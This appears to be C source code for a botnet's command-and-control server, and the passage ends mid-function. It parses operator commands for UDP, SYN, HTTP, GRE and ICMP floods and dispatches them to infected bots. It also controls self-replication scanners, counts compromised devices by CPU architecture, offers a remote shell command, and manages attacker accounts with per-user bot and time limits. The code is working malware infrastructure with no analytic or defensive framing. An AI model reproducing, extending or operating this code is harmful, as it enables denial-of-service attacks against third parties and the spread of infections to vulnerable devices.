#include "headers/command_handler.h"
#include "headers/botnet.h"
#include "headers/checks.h"
#include "headers/user_handler.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <stdbool.h>

int validate_ip_or_subnet(const char *ip);
void handle_openshell_command(const User *user, const char *command, int client_socket);

#define CYAN "\033[1;36m"

static char response_buf[MAX_COMMAND_LENGTH];
static char arch_cmd_buf[512];
static int valid_bot_count = 0;

void handle_bots_command(char *response);
void handle_clear_command(char *response);
void handle_attack_command(const User *user, const char *command, char *response);
void handle_stopall_command(const User *user, char *response);
void handle_user_command(const User *user, const char *command, char *response);
void handle_adduser_command(const User *user, int client_socket);
void handle_removeuser_command(const User *user, const char *command, char *response);
void handle_kickuser_command(const User *user, const char *command, char *response);
void handle_admin_command(const User *user, char *response);
void handle_ping_command(char *response);
void handle_botdump_command(const User *user, char *response);
void handle_selfrep_command(const User *user, const char *command, char *response);

/*
H E L P   C O M M A N D
*/
void handle_help_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             CYAN "!misc" YELLOW " - " RED "shows misc commands\r\n"
             CYAN "!attack" YELLOW " - " RED "shows attack methods\r\n"
             CYAN "!admin" YELLOW " - " RED "show admin and root commands\r\n"
             CYAN "!help" YELLOW " - " RED "shows this msg\r\n" RESET);
}

/*
M I S C   C O M M A N D S
*/
void handle_misc_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             CYAN "!stopall" YELLOW " - " RED "stops all atks\r\n"
             CYAN "!opthelp" YELLOW " - " RED "see attack options\r\n"
             CYAN "!bots" YELLOW " - " RED "list bots\r\n"
             CYAN "!user" YELLOW " - " RED "show user or other users\r\n"
             CYAN "!selfrep" YELLOW " - " RED "control scanners\r\n"
             CYAN "!clear" YELLOW " - " RED "clear screen\r\n"
             CYAN "!exit" YELLOW " - " RED "leave CNC\r\n" RESET);
}

/*
ATK LIST   C O M M A N D
*/
void handle_attack_list_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             CYAN "!udp" YELLOW " - " RED "Generic UDP Flood\r\n"
             CYAN "!syn" YELLOW " - " RED "TCP SYN Flood\r\n"
             CYAN "!http" YELLOW " - " RED "HTTP Flood\r\n"
             CYAN "!socket" YELLOW " - " RED "Socket Flood\r\n"
             CYAN "!icmp" YELLOW " - " RED "ICMP Flood\r\n"
             CYAN "!gre" YELLOW " - " RED "GRE Flood\r\n"
             CYAN "!udpplain" YELLOW " - " RED "Plain UDP Flood\r\n" RESET);
}

/*
OPTHELP   C O M M A N D
*/
void handle_opthelp_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             CYAN "Optional Arguments:\r\n"
             CYAN "psize" YELLOW " - " RED "Packet size | max: 1500\r\n"
             CYAN "srcport" YELLOW " - " RED "Src port for UDP/SYN/GRE | Default=Random\r\n"
             CYAN "botcount" YELLOW " - " RED "Limit number of bots to use\r\n"
             CYAN "proto" YELLOW " - " RED "GRE Protocol tcp/udp default=IP\r\n"
             CYAN "gport" YELLOW " - " RED "GRE Destination port\r\n"
             CYAN "httpmode" YELLOW " - " RED "HTTP Method (get,post,head) default=GET\r\n" RESET);
}

int is_attack_command(const char *command) {
    return strncmp(command, "!udp", 4) == 0 ||
           strncmp(command, "!syn", 4) == 0 ||
           strncmp(command, "!http", 5) == 0 ||
           strncmp(command, "!socket", 7) == 0 ||
           strncmp(command, "!icmp", 5) == 0 ||
           strncmp(command, "!gre", 4) == 0 ||
           strncmp(command, "!udpplain", 8) == 0;
}

void handle_layer3_attack_command(const User *user, const char *command, char *response) {
    static char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    static char proto[8];
    static char bot_command[MAX_COMMAND_LENGTH];
    static char *args[32];
    static int time, psize, botcount, gport, srcport;
    static int has_psize, has_botcount, has_proto, has_gport, has_srcport;
    static int arg_count;
    static int is_icmp, is_gre;
    
    memset(cmd, 0, sizeof(cmd));
    memset(ip, 0, sizeof(ip));
    memset(argstr, 0, sizeof(argstr));
    memset(proto, 0, sizeof(proto));
    memset(args, 0, sizeof(args));
    time = psize = botcount = gport = srcport = 0;
    has_psize = has_botcount = has_proto = has_gport = has_srcport = 0;
    arg_count = 0;
    is_icmp = is_gre = 0;

    if (sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr) < 3) {        
        if (strncmp(cmd, "!gre", 4) == 0)
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: !gre <ipv4> <time> [options] (recommended !opthelp)\033[0m\n");
        else
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: %s <ipv4> <time> [options]\033[0m\n", cmd);
        return;
    }

    if (!validate_ip_or_subnet(ip) || time <= 0 || time > user->maxtime) {
        snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rInvalid IP/subnet or time\033[0m\n");
        return;
    }

    if (is_blacklisted(ip)) {
        if (is_private_ip(ip)) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rError: Cannot attack private/reserved IP addresses\033[0m\n");
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rError: Target is blacklisted\033[0m\n");
        }
        return;
    }

    if (strlen(argstr) > 0) {
        char *token = strtok(argstr, " ");
        while (token && arg_count < 32) {
            args[arg_count++] = token;
            token = strtok(NULL, " ");
        }
    }

    if (strncmp(cmd, "!icmp", 5) == 0) {
        is_icmp = 1;
    } else if (strncmp(cmd, "!gre", 4) == 0) {
        is_gre = 1;
        psize = 32;
    }

    for (int i = 0; i < arg_count; i++) {
        if (strncmp(args[i], "psize=", 6) == 0) {
            if (has_psize) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate psize argument\033[0m\n");
                return;
            }
            const char *val = args[i] + 6;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize (need int)\033[0m\n");
                return;
            }
            psize = atoi(val);
            if (is_gre) {
                if (psize <= 0 || psize > 8192) {
                    snprintf(response, MAX_COMMAND_LENGTH, "\033[31mpsize MUST be 1-8192 for gre\033[0m\n");
                    return;
                }
            } else {
                if (!validate_psize(psize, cmd)) {
                    snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize\033[0m\n");
                    return;
                }
            }
            has_psize = 1;
        } else if (strncmp(args[i], "botcount=", 9) == 0) {
            if (has_botcount) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate botcount argument\033[0m\n");
                return;
            }
            const char *val = args[i] + 9;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid botcount (need int)\033[0m\n");
                return;
            }
            botcount = atoi(val);
            if (botcount <= 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid botcount (must be > 0)\033[0m\n");
                return;
            }
            if (botcount > user->maxbots) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mCancelled attack, your max bots are (%d)\033[0m\n", user->maxbots);
                return;
            }
            has_botcount = 1;
        } else if (is_gre && strncmp(args[i], "srcport=", 8) == 0) {
            if (has_srcport) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate srcport option\033[0m\n");
                return;
            }
            const char *val = args[i] + 8;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid srcport (need int)\033[0m\n");
                return;
            }
            srcport = atoi(val);
            if (!validate_srcport(srcport)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid srcport value (must be 1-65535)\033[0m\n");
                return;
            }
            has_srcport = 1;
        } else if (is_gre && strncmp(args[i], "proto=", 6) == 0) {
            if (has_proto) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate proto option\033[0m\n");
                return;
            }
            strncpy(proto, args[i] + 6, sizeof(proto) - 1);
            proto[sizeof(proto) - 1] = '\0';
            if (strcmp(proto, "tcp") != 0 && strcmp(proto, "udp") != 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid proto value, must be tcp or udp\033[0m\n");
                return;
            }
            has_proto = 1;
        } else if (is_gre && strncmp(args[i], "gport=", 6) == 0) {
            if (has_gport) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate gport argument\033[0m\n");
                return;
            }
            const char *val = args[i] + 6;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid gport (need int)\033[0m\n");
                return;
            }
            gport = atoi(val);
            if (!validate_port(gport)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid gport value (must be 1-65535)\033[0m\n");
                return;
            }
            has_gport = 1;
        } else if (!is_gre) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mUnknown option: %s\033[0m\n", args[i]);
            return;
        } else if (is_gre) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mUnknown option: %s\033[0m\n", args[i]);
            return;
        }
    }

    if (is_gre) {
        if (has_proto && !has_gport) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mgport= is required when proto= is set\033[0m\n");
            return;
        }
        if (!has_proto && has_gport) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mproto= is required when using gport=\033[0m\n");
            return;
        }
        if (has_srcport && !has_proto) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mproto= is required when using srcport=\033[0m\n");
            return;
        }
    }

    pthread_mutex_lock(&bot_mutex);
    int requested_bots = bot_count;
    if (has_botcount) {
        if (botcount > user->maxbots) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mYou have exceeded your max bots (%d)\033[0m\n", user->maxbots);
            pthread_mutex_unlock(&bot_mutex);
            return;
        }
        requested_bots = botcount;
    } else if (user->maxbots < bot_count) {
        requested_bots = user->maxbots;
    }

    int sent_bots = 0;
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid) {
            if (sent_bots >= requested_bots) break;
            
            if (is_gre) {
                if (has_proto && has_srcport)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d proto=%s gport=%d srcport=%d", 
                            cmd, ip, time, psize, proto, gport, srcport);
                else if (has_proto)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d proto=%s gport=%d", 
                            cmd, ip, time, psize, proto, gport);
                else
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
            } else {
                if (has_psize)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
                else
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d", cmd, ip, time);
            }
            
            send(bots[i].socket, bot_command, strlen(bot_command), MSG_NOSIGNAL);
            sent_bots++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = time;
    pthread_mutex_unlock(&cooldown_mutex);

    snprintf(response, MAX_COMMAND_LENGTH, "\033[32mSent instructions to %d bots\033[0m\n", sent_bots);
}

void process_command(const User *user, const char *command, int client_socket, const char *user_ip) {
    if (strlen(command) == 0) return;

    log_command(user->user, user_ip, command);

    if (is_attack_command(command)) {
        pthread_mutex_lock(&cooldown_mutex);
        if (global_cooldown > 0) {
            snprintf(response_buf, sizeof(response_buf), RED "\rGlobal cooldown still active for " YELLOW "%d seconds" RESET "\n", global_cooldown);
            pthread_mutex_unlock(&cooldown_mutex);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        pthread_mutex_unlock(&cooldown_mutex);
    }

    if (strcmp(command, "!help") == 0) {
        handle_help_command(response_buf);
    } else if (strcmp(command, "!misc") == 0) {
        handle_misc_command(response_buf);
    } else if (strcmp(command, "!admin") == 0) {
        handle_admin_command(user, response_buf);
    } else if (strcmp(command, "!attack") == 0) {
        handle_attack_list_command(response_buf);
    } else if (strcmp(command, "!bots") == 0) {
        handle_bots_command(response_buf);
    } else if (strcmp(command, "!ping") == 0) {
        handle_ping_command(response_buf);
    } else if (strcmp(command, "!botdump") == 0) {
        handle_botdump_command(user, response_buf);
    } else if (strcmp(command, "!clear") == 0) {
        handle_clear_command(response_buf);
    } else if (strcmp(command, "!opthelp") == 0) {
        handle_opthelp_command(response_buf);
    } else if (strcmp(command, "!exit") == 0) {
        snprintf(response_buf, sizeof(response_buf), YELLOW "\rGoodbye!\n" RESET);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        close(client_socket);
        return;
    } else if (strncmp(command, "!user", 5) == 0) {
        handle_user_command(user, command, response_buf);
    } else if (strcmp(command, "!adduser") == 0) {
        handle_adduser_command(user, client_socket);
        return;
    } else if (strncmp(command, "!removeuser", 10) == 0) {
        handle_removeuser_command(user, command, response_buf);
    } else if (strncmp(command, "!kickuser", 9) == 0) {
        handle_kickuser_command(user, command, response_buf);
    } else if (strncmp(command, "!icmp", 5) == 0 || strncmp(command, "!gre", 4) == 0) {
        handle_layer3_attack_command(user, command, response_buf);
    } else if (strncmp(command, "!selfrep", 8) == 0) {
        handle_selfrep_command(user, command, response_buf);
    } else if (strcmp(command, "!stopall") == 0) {
        handle_stopall_command(user, response_buf);
    } else if (is_attack_command(command)) {
        handle_attack_command(user, command, response_buf);
    } else if (strncmp(command, "!openshell", 10) == 0) {
        handle_openshell_command(user, command, client_socket);
        return;
    } else {
        snprintf(response_buf, sizeof(response_buf), RED "\rCommand not found\n" RESET);
    }

    send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
}

void handle_attack_command(const User *user, const char *command, char *response) {
    static char cmd[16], ip[32], argstr[MAX_COMMAND_LENGTH];
    static char *args[32];
    static char bot_command[MAX_COMMAND_LENGTH];
    int port = 0, time = 0, srcport = 0, psize = 0, botcount = 0;
    int has_srcport = 0, has_psize = 0, has_botcount = 0;
    int has_httpmode = 0;
    uint8_t http_method = 0;
    has_httpmode = 0;
    int arg_count = 0;
    int is_icmp = strcmp(command, "!icmp") == 0;

    memset(argstr, 0, sizeof(argstr));
    memset(cmd, 0, sizeof(cmd));
    memset(ip, 0, sizeof(ip));
    memset(args, 0, sizeof(args));

    if (is_icmp) {
        if (sscanf(command, "%15s %31s %d %[^\n]", cmd, ip, &time, argstr) < 3) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: !icmp <ipv4> <time> [options]\033[0m\n");
            return;
        }
    } else {
        if (sscanf(command, "%15s %31s %d %d %[^\n]", cmd, ip, &port, &time, argstr) < 4) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rUsage: !method <ipv4> <dport> <time> [options]\033[0m\n");
            return;
        }
    }

    if (!validate_ip_or_subnet(ip) || time <= 0 || time > user->maxtime) {
        snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rInvalid IP/subnet or time\033[0m\n");
        return;
    }

    if (is_blacklisted(ip)) {
        if (is_private_ip(ip)) {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rError: Cannot attack private/reserved IP addresses\033[0m\n");
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rError: Target is blacklisted\033[0m\n");
        }
        return;
    }

    if (!is_icmp && !validate_port(port)) {
        snprintf(response, MAX_COMMAND_LENGTH, "\033[31m\rInvalid port\033[0m\n");
        return;
    }

    if (strlen(argstr) > 0) {
        char *token = strtok(argstr, " ");
        while (token && arg_count < 32) {
            args[arg_count++] = token;
            token = strtok(NULL, " ");
        }
    }

    for (int i = 0; i < arg_count; i++) {
        if (strncmp(args[i], "httpmode=", 9) == 0) {
            if (has_httpmode) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate httpmode argument\033[0m\n");
                return;
            }
            has_httpmode = 1;

            if (strcmp(cmd, "!http") != 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mhttpmode only supported for HTTP method\033[0m\n");
                return;
            }
            char *mode = args[i] + 9;
            char *token = strtok(mode, ",");
            int invalid_method = 0;
            while (token != NULL) {
                if (strcmp(token, "post") == 0) http_method |= 2;
                else if (strcmp(token, "head") == 0) http_method |= 4;
                else if (strcmp(token, "get") == 0) http_method |= 1;
                else {
                    invalid_method = 1;
                    break;
                }
                token = strtok(NULL, ",");
            }
            if (invalid_method || http_method == 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mUnknown httpmode option. Valid modes: get,post,head\033[0m\n");
                return;
            }
        } else if (strncmp(args[i], "srcport=", 8) == 0) {
            if (has_srcport) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate srcport argument\033[0m\n");
                return;
            }
            if (is_icmp || strcmp(cmd, "!vse") == 0 || strcmp(cmd, "!http") == 0 || strcmp(cmd, "!socket") == 0 || strcmp(cmd, "!raknet") == 0 || strcmp(cmd, "!udpplain") == 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31msrcport not supported for this method\033[0m\n");
                return;
            }
            const char *val = args[i] + 8;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid srcport (not an integer)\033[0m\n");
                return;
            }
            srcport = atoi(val);
            if (srcport > 0) {
                if (!validate_srcport(srcport)) {
                    snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid srcport!\033[0m\n");
                    return;
                }
            }
            has_srcport = 1;
        } else if (strncmp(args[i], "psize=", 6) == 0) {
            if (has_psize) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate psize argument\033[0m\n");
                return;
            }
            if (!(strcmp(cmd, "!udp") == 0 || strcmp(cmd, "!syn") == 0 || strcmp(cmd, "!vse") == 0 || 
                strcmp(cmd, "!raknet") == 0 || strcmp(cmd, "!udpplain") == 0 || is_icmp)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mpsize not supported for this method\033[0m\n");
                return;
            }
            const char *val = args[i] + 6;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize (need int)\033[0m\n");
                return;
            }
            psize = atoi(val);
            if (!validate_psize(psize, cmd)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid psize\033[0m\n");
                return;
            }
            has_psize = 1;
        } else if (strncmp(args[i], "botcount=", 9) == 0) {
            if (has_botcount) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mDuplicate botcount argument\033[0m\n");
                return;
            }
            const char *val = args[i] + 9;
            if (!is_valid_int(val)) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid botcount (need int)\033[0m\n");
                return;
            }
            botcount = atoi(val);
            if (botcount <= 0) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mInvalid botcount (must be > 0)\033[0m\n");
                return;
            }
            if (botcount > user->maxbots) {
                snprintf(response, MAX_COMMAND_LENGTH, "\033[31mCancelled attack, your max bots are (%d)\033[0m\n", user->maxbots);
                return;
            }
            has_botcount = 1;
        } else {
            snprintf(response, MAX_COMMAND_LENGTH, "\033[31mUnknown option: %s\033[0m\n", args[i]);
            return;
        }
    }

    pthread_mutex_lock(&bot_mutex);
    int requested_bots = bot_count;
    if (has_botcount) {
        requested_bots = botcount;
    } else if (user->maxbots < bot_count) {
        requested_bots = user->maxbots;
    }
    int sent_bots = 0;
    
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid) {
            if (sent_bots >= requested_bots) break;
            
            if (is_icmp) {
                if (has_psize)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d psize=%d", cmd, ip, time, psize);
                else
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d", cmd, ip, time);
            } else {
                if (strcmp(cmd, "!http") == 0) {
                    if (has_psize)
                        snprintf(bot_command, sizeof(bot_command), "%s %s %d %d psize=%d httpmode=%d", cmd, ip, port, time, psize, http_method);
                    else
                        snprintf(bot_command, sizeof(bot_command), "%s %s %d %d httpmode=%d", cmd, ip, port, time, http_method);
                } else if (has_srcport && has_psize)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d %d srcport=%d psize=%d", cmd, ip, port, time, srcport, psize);
                else if (has_srcport)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d %d srcport=%d", cmd, ip, port, time, srcport);
                else if (has_psize)
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d %d psize=%d", cmd, ip, port, time, psize);
                else
                    snprintf(bot_command, sizeof(bot_command), "%s %s %d %d", cmd, ip, port, time);
            }
            send(bots[i].socket, bot_command, strlen(bot_command), MSG_NOSIGNAL);
            sent_bots++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = time;
    pthread_mutex_unlock(&cooldown_mutex);

    snprintf(response, MAX_COMMAND_LENGTH, "\033[32mSent instructions to %d bots\033[0m\n", sent_bots);
}

void handle_bots_command(char *response) {
    #define NUM_ARCHS 16
    static int arch_count[NUM_ARCHS];
    static const char* arch_names[] = {"arc", "powerpc", "sh4", "mips", "mipsel", "x86_64", "m68k", "sparc", "i486", "aarch64", "armv4l", "armv5l", "armv6l", "armv7l", "csky", "unknown"};
    static int valid_bots;
    int offset;
    
    memset(arch_count, 0, sizeof(arch_count));
    valid_bots = 0;
    
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (!bots[i].is_valid) continue;
        
        int is_duplicate = 0;
        for (int j = 0; j < i; j++) {
            if (bots[j].is_valid && bots[j].address.sin_addr.s_addr == bots[i].address.sin_addr.s_addr) {
                is_duplicate = 1;
                break;
            }
        }
        if (is_duplicate) continue;
        
        valid_bots++;
        int found = 0;
        for (int j = 0; j < NUM_ARCHS-1 && !found; j++) {
            if (bots[i].arch != NULL && strcmp(bots[i].arch, arch_names[j]) == 0) {
                arch_count[j]++;
                found = 1;
            }
        }
        if (!found) {
            arch_count[NUM_ARCHS-1]++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    offset = snprintf(response, MAX_COMMAND_LENGTH, YELLOW "Total bots: %d\n" RESET, valid_bots);
    for (int i = 0; i < NUM_ARCHS; i++) {
        if (arch_count[i] > 0) {
            offset += snprintf(response + offset, MAX_COMMAND_LENGTH - offset, CYAN "\r%s: %d\r\n" RESET, arch_names[i], arch_count[i]);
        }
    }
}

void handle_clear_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH, "\033[H\033[J");
}

void handle_stopall_command(const User *user, char *response) {
    static int allow_stopall;
    static int stopped_count;
    static const char stop_cmd[] = "stop";
    
    allow_stopall = 0;
    stopped_count = 0;
    
    if (user->is_admin) {
        allow_stopall = 1;
    } else {
        FILE* sf = fopen("database/settings.txt", "r");
        if (sf) {
            char line[128] = {0};
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalstopall:", 13) == 0) {
                    allow_stopall = strstr(line, "yes") ? 1 : 0;
                    break;
                }
            }
            fclose(sf);
        }
    }

    if (!allow_stopall) {
        snprintf(response, MAX_COMMAND_LENGTH, "\r" RED "Error: You don't have permission to use !stopall\n" RESET);
        return;
    }

    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid && bots[i].socket > 0) {
            if (send(bots[i].socket, stop_cmd, strlen(stop_cmd), MSG_NOSIGNAL) > 0) {
                stopped_count++;
            }
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    
    pthread_mutex_lock(&cooldown_mutex);
    global_cooldown = 0;
    pthread_mutex_unlock(&cooldown_mutex);
    
    snprintf(response, MAX_COMMAND_LENGTH, "\r" PINK "Sent stop command to %d active bots\n" RESET, stopped_count);
}

void handle_user_command(const User *user, const char *command, char *response) {
    if (!user->is_admin) {
        FILE *sf = fopen("database/settings.txt", "r");
        int allow_non_admin = 0;
        if (sf) {
            char line[128];
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalusercommand:", 17) == 0 && strstr(line, "yes")) {
                    allow_non_admin = 1;
                    break;
                }
            }
            fclose(sf);
        }
        if (!allow_non_admin) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "\ronly admins can use !user command\r\n" RESET);
            return;
        }
    }
    
    char target_user[50] = {0};
    if (sscanf(command, "!user %49s", target_user) == 1) {
        int found = 0;
        for (int i = 0; i < user_count; i++) {
            if (strcmp(users[i].user, target_user) == 0) {
                snprintf(response, MAX_COMMAND_LENGTH,
                    YELLOW "Username: %s\r\n"
                    "Max time: %d\r\n"
                    "Max bots: %d\r\n"
                    "Admin: %s\r\n"
                    "Connected: %s\r\n" RESET,
                    users[i].user,
                    users[i].maxtime,
                    users[i].maxbots,
                    users[i].is_admin ? "yes" : "no",
                    users[i].is_logged_in ? "yes" : "no");
                found = 1;
                break;
            }
        }
        if (!found) {
            snprintf(response, MAX_COMMAND_LENGTH, RED "User not found\r\n" RESET);
        }
    } else {
        snprintf(response, MAX_COMMAND_LENGTH,
            YELLOW "Username: %s\r\n"
            "Max time: %d\r\n"
            "Max bots: %d\r\n"
            "Admin: %s\r\n"
            "Connected: yes\r\n" RESET,
            user->user,
            user->maxtime,
            user->maxbots,
            user->is_admin ? "yes" : "no");
    }
}

void handle_adduser_command(const User *user, int client_socket) {
    static char response[MAX_COMMAND_LENGTH];
    static char buffer[128];
    static char newuser[50];
    static char newpass[50];
    static char rootuser[50];
    static char tmp[256];
    static int maxtime, maxbots, is_admin;
    static int is_root;
    static ssize_t len;
    memset(newuser, 0, sizeof(newuser));
    memset(newpass, 0, sizeof(newpass));
    memset(rootuser, 0, sizeof(rootuser));
    is_root = 0;
    FILE *sf = fopen("database/settings.txt", "r");
    if (sf) {
        char line[128];
        while (fgets(line, sizeof(line), sf)) {
            if (strncmp(line, "rootuser:", 9) == 0) {
                sscanf(line + 9, " %49s", rootuser);
                if (strcmp(user->user, rootuser) == 0) {
                    is_root = 1;
                }
                break;
            }
        }
        fclose(sf);
    }
    if (!is_root) {
        snprintf(response, sizeof(response), RED "Only root user can add users\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    snprintf(response, sizeof(response), BLUE "Username: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int uidx = 0;
    while (1) {
        len = recv(client_socket, buffer + uidx, sizeof(buffer) - 1 - uidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = uidx; i < uidx + len; i++) {
            if (buffer[i] == '\n' || buffer[i] == '\r') {
                buffer[i] = 0;
                found = 1;
                break;
            }
        }
        uidx += len;
        if (found) break;
        if (uidx >= (int)sizeof(buffer) - 1) return;
    }
    uidx = 0;
    for (int i = 0; buffer[i] && uidx < 49; i++) {
        char c = buffer[i];
        if (c == '\r' || c == '\n') break;
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '_') {
            newuser[uidx++] = c;
        }
    }
    newuser[uidx] = 0;
    if (strlen(newuser) < 3) {
        snprintf(response, sizeof(response), RED "\r\nUsername must be at least 3 characters\r\n\r\n" RESET BLUE "Username: " RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, newuser) == 0) {
            snprintf(response, sizeof(response), RED "\r\nUser already exists\r\n\r\n" RESET BLUE "Username: " RESET);
            send(client_socket, response, strlen(response), MSG_NOSIGNAL);
            return;
        }
    }
    snprintf(response, sizeof(response), BLUE "Password: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int pidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + pidx, sizeof(buffer) - 1 - pidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = pidx; i < pidx + len; i++) {
            if (buffer[i] == '\n' || buffer[i] == '\r') {
                buffer[i] = 0;
                found = 1;
                break;
            }
        }
        pidx += len;
        if (found) break;
        if (pidx >= (int)sizeof(buffer) - 1) return;
    }
    pidx = 0;
    for (int i = 0; buffer[i] && pidx < 49; i++) {
        char c = buffer[i];
        if (c == '\r' || c == '\n') break;
        if (c >= 32 && c <= 126) {
            newpass[pidx++] = c;
        }
    }
    newpass[pidx] = 0;
    if (strlen(newpass) < 4) {
        snprintf(response, sizeof(response), RED "Password must be at least 4 characters\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    snprintf(response, sizeof(response), BLUE "Admin (y/n): " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int adminidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + adminidx, sizeof(buffer) - 1 - adminidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = adminidx; i < adminidx + len; i++) {
            char c = buffer[i];
            if (c == 'y' || c == 'Y' || c == 'n' || c == 'N') {
                is_admin = (c == 'y' || c == 'Y') ? 1 : 0;
                found = 1;
                break;
            }
        }
        adminidx += len;
        if (found) break;
        if (adminidx >= (int)sizeof(buffer) - 1) return;
    }
    snprintf(response, sizeof(response), BLUE "Max attack time (seconds): " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int timeidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + timeidx, sizeof(buffer) - 1 - timeidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = timeidx; i < timeidx + len; i++) {
            if (buffer[i] == '\n' || buffer[i] == '\r') {
                buffer[i] = 0;
                found = 1;
                break;
            }
        }
        timeidx += len;
        if (found) break;
        if (timeidx >= (int)sizeof(buffer) - 1) return;
    }
    buffer[strcspn(buffer, "\r\n")] = 0;
    if (sscanf(buffer, "%d", &maxtime) != 1 || maxtime <= 0) {
